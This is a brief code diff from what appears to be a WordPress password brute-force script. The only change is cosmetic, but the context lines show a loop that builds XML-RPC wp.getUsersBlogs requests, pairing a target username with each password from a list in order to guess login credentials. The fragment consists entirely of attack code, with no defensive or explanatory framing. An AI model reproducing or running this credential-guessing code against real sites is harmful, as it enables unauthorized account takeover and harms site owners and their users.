@@ -15,7 +15,7 @@ def doIt(u, p, o):
         
         payload = '<value><struct><member><name>methodName</name><value><string>wp.getUsersBlogs</string></value></member><member><name>params</name><value><array><data><value><array><data><value><string>'+USER+'</string></value><value><string>'+passList[idx]+'</string></value></data></array></value></data></array></value></member></struct></value>'
         blank = '\n'
-        payList.append((payload))
+        payList.append(payload)
         payList.append(blank)
         
         idx = idx + 1
